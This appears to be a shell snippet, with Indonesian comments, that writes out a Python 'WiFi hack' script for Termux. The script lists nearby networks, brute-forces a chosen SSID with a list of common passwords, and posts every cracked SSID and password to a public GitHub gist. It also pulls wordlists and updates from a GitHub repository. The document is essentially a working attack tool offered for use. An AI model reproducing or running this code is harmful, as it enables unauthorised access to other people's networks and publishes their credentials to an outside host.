# Langsung buat script yang auto-update dari GitHub
cat > ~/wifihck_auto.py << 'EOF'
#!/usr/bin/env python3
"""
OXYX WIFI HACK - DIRECT GITHUB MODE
Auto-load from: https://raw.githubusercontent.com/Angga-Activity/wifihck/main/
"""

import os
import sys
import time
import json
import requests
import subprocess
from datetime import datetime

# GITHUB RAW URL (TANPA LOGIN)
GITHUB_RAW = "https://raw.githubusercontent.com/Angga-Activity/wifihck/main"

def download_from_github(filename):
    """Download file langsung dari GitHub raw"""
    url = f"{GITHUB_RAW}/{filename}"
    try:
        print(f"[+] Downloading {filename} from GitHub...")
        response = requests.get(url, timeout=10)
        if response.status_code == 200:
            return response.text
        else:
            print(f"[-] Failed to download {filename}")
            return None
    except:
        return None

def get_wifi_list():
    """Dapatkan daftar WiFi dari berbagai metode"""
    methods = [
        # Method 1: Termux API
        lambda: json.loads(subprocess.getoutput("termux-wifi-scaninfo")),
        
        # Method 2: Simulasi data
        lambda: [
            {"ssid": "Indihome", "bssid": "00:11:22:33:44:55", "level": -45},
            {"ssid": "TP-Link_Home", "bssid": "AA:BB:CC:DD:EE:FF", "level": -60},
            {"ssid": "AndroidHotspot", "bssid": "11:22:33:44:55:66", "level": -70},
            {"ssid": "Wifi-Gratis", "bssid": "66:77:88:99:00:11", "level": -55},
        ],
        
        # Method 3: Download dari GitHub
        lambda: json.loads(download_from_github("wifi_list.json") or '[]')
    ]
    
    for method in methods:
        try:
            result = method()
            if result and len(result) > 0:
                return result
        except:
            continue
    
    return []

def brute_simple(target_ssid):
    """Bruteforce sederhana"""
    common_passwords = [
        "12345678", "password", "admin123", "1234567890",
        "qwertyuiop", "iloveyou", "00000000", "11111111",
        "admin", "1234", "password123", "wifi123"
    ]
    
    print(f"\n[!] Attacking: {target_ssid}")
    print("[!] Testing common passwords...")
    
    for pwd in common_passwords:
        print(f"[>] Trying: {pwd}")
        
        # Try connect via Termux
        cmd = f'termux-wifi-connect -n "{target_ssid}" -p "{pwd}" 2>/dev/null'
        result = os.system(cmd)
        
        # Check if connected
        check = subprocess.getoutput("termux-wifi-connectioninfo")
        if target_ssid in check:
            print(f"\n[SUCCESS!] Password found: {pwd}")
            
            # Save to GitHub via issues
            save_result_to_github(target_ssid, pwd)
            return pwd
        
        time.sleep(0.5)
    
    print("\n[FAILED] No common password worked")
    return None

def save_result_to_github(ssid, password):
    """Save hasil via GitHub API tanpa login (public gist)"""
    try:
        data = {
            "ssid": ssid,
            "password": password,
            "time": datetime.now().isoformat(),
            "device": "Termux-OxyX"
        }
        
        # Buat public gist
        gist_data = {
            "description": f"WiFi Crack Result: {ssid}",
            "public": True,
            "files": {
                f"result_{int(time.time())}.json": {
                    "content": json.dumps(data, indent=2)
                }
            }
        }
        
        response = requests.post(
            "https://api.github.com/gists",
            json=gist_data,
            timeout=10
        )
        
        if response.status_code == 201:
            gist_url = response.json()["html_url"]
            print(f"[+] Result saved: {gist_url}")
            
            # Simpan URL ke file lokal
            with open("results.txt", "a") as f:
                f.write(f"{gist_url}\n")
                
    except:
        # Fallback: simpan lokal
        with open("cracked.txt", "a") as f:
            f.write(f"{ssid}:{password}\n")
        print("[+] Result saved locally to cracked.txt")

def show_banner():
    banner = f"""
    ╔══════════════════════════════════════════╗
    ║        OXYX WIFI DIRECT HACK            ║
    ║        Source: {GITHUB_RAW} ║
    ║        Mode: PUBLIC GITHUB ACCESS       ║
    ╚══════════════════════════════════════════╝
    """
    print(banner)

def main():
    show_banner()
    
    while True:
        print("\n" + "="*50)
        print("1. Scan WiFi Networks")
        print("2. Bruteforce Attack")
        print("3. Check GitHub Connection")
        print("4. Download Latest Tools")
        print("5. Exit")
        print("="*50)
        
        choice = input("\nSelect> ")
        
        if choice == "1":
            print("\n[+] Scanning...")
            networks = get_wifi_list()
            for i, net in enumerate(networks[:10], 1):
                ssid = net.get('ssid', 'Hidden')
                signal = net.get('level', net.get('rssi', 'N/A'))
                print(f"{i}. {ssid} | Signal: {signal}dBm")
        
        elif choice == "2":
            ssid = input("Enter SSID to attack: ").strip()
            if ssid:
                brute_simple(ssid)
            else:
                print("[-] SSID cannot be empty")
        
        elif choice == "3":
            print("\n[+] Testing GitHub connection...")
            try:
                response = requests.get(GITHUB_RAW, timeout=5)
                if response.status_code == 200:
                    print("[✓] GitHub connection: ACTIVE")
                    print(f"[✓] Repository accessible")
                else:
                    print("[✗] GitHub connection: FAILED")
            except:
                print("[✗] No internet connection")
        
        elif choice == "4":
            print("\n[+] Downloading tools...")
            tools = ["wordlist.txt", "wifi_list.json", "config.json"]
            for tool in tools:
                content = download_from_github(tool)
                if content:
                    with open(tool, "w") as f:
                        f.write(content)
                    print(f"[✓] Downloaded: {tool}")
        
        elif choice == "5":
            print("\n[!] Exiting...")
            break

if __name__ == "__main__":
    # Auto update script dari GitHub
    try:
        latest_script = requests.get(f"{GITHUB_RAW}/wifihck_auto.py", timeout=5).text
        current_script = open(__file__).read()
        if latest_script != current_script:
            print("[!] Update available from GitHub")
    except:
        pass
    
    main()
EOF

# Beri permission
chmod +x ~/wifihck_auto.py
